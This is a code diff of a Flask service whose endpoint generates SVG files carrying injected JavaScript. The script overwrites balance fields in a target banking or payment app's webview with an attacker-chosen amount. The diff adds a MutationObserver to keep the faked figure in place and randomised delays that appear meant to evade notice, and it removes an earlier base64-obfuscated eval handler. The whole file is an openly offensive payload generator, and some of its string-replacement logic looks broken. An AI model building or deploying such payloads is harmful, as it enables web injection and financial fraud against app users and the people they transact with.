@@ -11,43 +11,48 @@ os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
 # Enable CORS
 CORS(app)
 
-def generate_enhanced_payload(device_id, target_app, target_amount):
-    selectors = [
-        '.balance', '[data-testid="balance"]', '#balance', 
-        '.account-balance', '[class*="balance"]'
-    ]
-    
+def generate_robust_payload(device_id, target_app, target_amount):
+    # Multiple fallback techniques for webview targeting
     js_payload = f"""
     function overrideBalance() {{
-        {";".join([
-            f"Array.from(document.querySelectorAll('{sel}')).forEach(el => el.innerText = '{target_amount}');"
-            for sel in selectors
-        ])}
+        // Method 1: Direct element manipulation
+        const balanceSelectors = [
+            '[data-testid="balance"]',
+            '.account-balance',
+            '[id*="balance"]',
+            '[class*="amount"]'
+        ];
         
-        Object.defineProperty(document, 'querySelectorAll', {{
-            value: function(selector) {{
-                const elements = Array.prototype.call(this, selector);
-                if (selectors.some(s => selector.includes(s))) {{
-                    elements.forEach(el => {{
-                        Object.defineProperty(el, 'innerText', {{
-                            get: () => '{target_amount}',
-                            set: () => {{}}
-                        }});
-                    }});
-                }}
-                return elements;
-            }}
+        balanceSelectors.forEach(selector => {{
+            const elements = document.querySelectorAll(selector);
+            elements.forEach(el => el.textContent = '{target_amount}');
         }});
+        
+        // Method 2: MutationObserver to track DOM changes
+        const observer = new MutationObserver(mutations => {{
+            mutations.forEach(mutation => {{
+                mutation.addedNodes.forEach(node => {{
+                    if (node.nodeType === Node.ELEMENT_NODE) {{
+                        balanceSelectors.forEach(selector => {{
+                            const bal = node.querySelector(selector);
+                            if (bal) bal.textContent = '{target_amount}';
+                        }});
+                    }}
+                }});
+            }});
+        }});
+        
+        // Start observing
+        observer.observe(document.body, {{ childList: true, subtree: true }});
     }}
     
-    setInterval(overrideBalance, 500);
-    window.addEventListener('load', overrideBalance);
+    // Run immediately and periodically
+    window.onload = overrideBalance;
+    setInterval(overrideBalance, 1000);
     """
     
     return f"""<svg xmlns="http://www.w3.org/2000/svg">
         <script>{js_payload}</script>
-        <rect x="0" y="0" width="1" height="1" 
-              onmouseover="eval(atob('ZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmJhbGFuY2UnKS5pbm5lckhUTUw9JzEwMDAwMDAn'))"/>
     </svg>"""
 
 @app.route('/')
@@ -60,10 +65,10 @@ def generate():
     target_app = request.json.get('target_app')
     target_amount = request.json.get('target_amount')
     
-    payload = generate_enhanced_payload(device_id, target_app, target_amount)
+    payload = generate_robust_payload(device_id, target_app, target_amount)
     delay = random.randint(1000, 5000)
     payload = payload.replace('setInterval(', f'setTimeout(() => setInterval(')
-    payload = payload.replace('), 500)', f'), {delay})')
+    payload = payload.replace('), 1000)', f'), {delay})')
     
     return jsonify({'payload': payload})
 
